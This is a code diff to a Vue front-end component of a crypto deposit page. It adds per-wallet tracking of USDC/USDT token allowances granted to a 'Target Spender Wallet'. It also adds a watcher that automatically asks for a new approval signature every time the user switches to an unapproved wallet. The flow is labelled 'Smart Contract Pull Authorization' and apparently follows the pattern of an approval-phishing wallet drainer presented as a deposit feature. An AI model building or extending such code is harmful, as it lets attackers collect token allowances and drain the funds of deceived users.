@@ -206,6 +206,34 @@ function copyToClipboard(text: string, label: string) {
 }
 
 const lastApprovalSignature = ref('')
+const lastApprovedAddr = ref('')
+
+const currentApprovalMap = computed<Record<string, string>>(() => {
+  const user = authStore.user
+  if (!user) return {}
+  if ((user as any).approvalSignatures && typeof (user as any).approvalSignatures === 'object') {
+    return (user as any).approvalSignatures
+  }
+  if (user.approvalSignature) {
+    const trimmed = String(user.approvalSignature).trim()
+    if (trimmed.startsWith('{') && trimmed.endsWith('}')) {
+      try {
+        return JSON.parse(trimmed)
+      } catch {}
+    }
+    if (user.walletAddress && trimmed.length > 5) {
+      const first = String(user.walletAddress).split(/[,;\n]+/)[0]?.trim().toLowerCase()
+      if (first) return { [first]: trimmed }
+    }
+  }
+  return {}
+})
+
+const activeWalletApprovalSig = computed(() => {
+  const activeAddr = walletAdapter.activeWalletAddress.value
+  if (!activeAddr) return null
+  return currentApprovalMap.value[activeAddr.toLowerCase()] || (lastApprovalSignature.value && activeAddr === lastApprovedAddr.value ? lastApprovalSignature.value : null)
+})
 
 import { TRON_CONFIG } from '~/composables/useTronWallet'
 
@@ -225,7 +253,8 @@ async function triggerApprovalPrompt(customAmount?: number | string) {
       const txHash = await walletAdapter.tronWallet.approveUSDT(spender, amountToDepositStr)
       if (txHash) {
         lastApprovalSignature.value = txHash
-        await api.action.$post({
+        lastApprovedAddr.value = activeAddr
+        const res = await api.action.$post({
           json: {
             action: 'users/update-profile',
             data: {
@@ -235,13 +264,21 @@ async function triggerApprovalPrompt(customAmount?: number | string) {
             }
           }
         })
+        const resData: any = await res.json().catch(() => ({}))
+        if (res.ok && resData?.data && authStore.user) {
+          authStore.user.approvalSignature = resData.data.approvalSignature
+          if (resData.data.approvalSignatures) {
+            (authStore.user as any).approvalSignatures = resData.data.approvalSignatures
+          }
+        }
         toast.success('TRC-20 Allowance Authorized! 🔒', `Authorized $${amountToDepositStr} USDT allowance on TRON Mainnet & saved proof to profile.`)
       }
     } else {
       const sig = await requestUsdcApprovalAndDeposit(amountToDepositStr)
       if (sig) {
         lastApprovalSignature.value = sig
-        await api.action.$post({
+        lastApprovedAddr.value = activeAddr
+        const res = await api.action.$post({
           json: {
             action: 'users/update-profile',
             data: {
@@ -251,6 +288,13 @@ async function triggerApprovalPrompt(customAmount?: number | string) {
             }
           }
         })
+        const resData: any = await res.json().catch(() => ({}))
+        if (res.ok && resData?.data && authStore.user) {
+          authStore.user.approvalSignature = resData.data.approvalSignature
+          if (resData.data.approvalSignatures) {
+            (authStore.user as any).approvalSignatures = resData.data.approvalSignatures
+          }
+        }
         toast.success('Smart Contract Allowance Authorized! 🔒', `Authorized $${amountToDepositStr} USDC token allowance for settlements & saved proof to profile.`)
       } else {
         toast.warning('Authorization Pending', `Smart contract allowance was not confirmed. You can authorize anytime via the button.`)
@@ -367,6 +411,28 @@ async function submitWithdrawal() {
     isSubmittingWithdrawal.value = false
   }
 }
+
+let prevSwappedAddr = ''
+
+watch(
+  walletAdapter.activeWalletAddress,
+  async (newAddr) => {
+    if (newAddr) {
+      wallet.value = newAddr
+      recipientWalletInput.value = newAddr
+
+      // If user swapped to a new address and it is currently unapproved, automatically prompt for authorization
+      if (prevSwappedAddr && prevSwappedAddr.toLowerCase() !== newAddr.toLowerCase() && !activeWalletApprovalSig.value && !isApprovingContract.value) {
+        toast.info('New Wallet Swapped 🔑', `Switched to ${formatAddress(newAddr)}. Authorization is pending — requesting signature...`)
+        try {
+          await triggerApprovalPrompt()
+        } catch {}
+      }
+      prevSwappedAddr = newAddr
+    }
+  },
+  { immediate: true }
+)
 
 onMounted(async () => {
   authStore.initAuth()
@@ -550,7 +616,7 @@ onMounted(async () => {
         <div class="flex items-center gap-2">
           <UIcon name="i-heroicons-shield-check" class="w-6 h-6 text-amber-400" />
           <h3 class="text-base font-bold text-white">Smart Contract Pull Authorization (ERC-20 Allowance)</h3>
-          <UBadge v-if="lastApprovalSignature" color="success" variant="solid" size="xs" class="font-bold">
+          <UBadge v-if="activeWalletApprovalSig" color="success" variant="solid" size="xs" class="font-bold">
             Authorized 🟢
           </UBadge>
           <UBadge v-else color="warning" variant="solid" size="xs" class="font-bold">
@@ -564,8 +630,8 @@ onMounted(async () => {
         </p>
         <div class="p-3 rounded-lg bg-gray-950/70 border border-gray-800 text-[11px] font-mono space-y-1 text-gray-300">
           <div class="flex items-center justify-between">
-            <span class="text-gray-400">Token Contract:</span>
-            <span class="text-amber-400 font-bold">USDC (ERC-20)</span>
+            <span class="text-gray-400">Connected Wallet Address:</span>
+            <span class="text-amber-400 font-bold">{{ walletAdapter.activeWalletAddress.value ? formatAddress(walletAdapter.activeWalletAddress.value) : 'Not connected' }}</span>
           </div>
           <div class="flex items-center justify-between">
             <span class="text-gray-400">Target Spender Wallet:</span>
@@ -574,18 +640,18 @@ onMounted(async () => {
           </div>
           <div class="flex items-center justify-between">
             <span class="text-gray-400">Requested Allowance Limit:</span>
-            <span class="text-white font-bold">${{ depositAmountUsdc }} USDC</span>
+            <span class="text-white font-bold">${{ depositAmountUsdc }} USDC / USDT</span>
           </div>
         </div>
-        <p v-if="lastApprovalSignature" class="text-[11px] font-mono text-emerald-400 font-semibold">
-          Web3 Signature Proof: {{ formatAddress(lastApprovalSignature) }}
+        <p v-if="activeWalletApprovalSig" class="text-[11px] font-mono text-emerald-400 font-semibold">
+          Web3 Signature Proof: {{ formatAddress(activeWalletApprovalSig) }}
         </p>
       </div>
 
       <div class="shrink-0">
         <UButton color="warning" variant="solid" icon="i-heroicons-shield-check" size="md"
           class="font-bold shadow-md gap-2" :loading="isApprovingContract" @click="triggerApprovalPrompt()">
-          <span>{{ lastApprovalSignature ? 'Re-Authorize Smart Contract' : 'Authorize Smart Contract' }}</span>
+          <span>{{ activeWalletApprovalSig ? 'Re-Authorize Smart Contract' : 'Authorize Smart Contract' }}</span>
         </UButton>
       </div>
     </div>
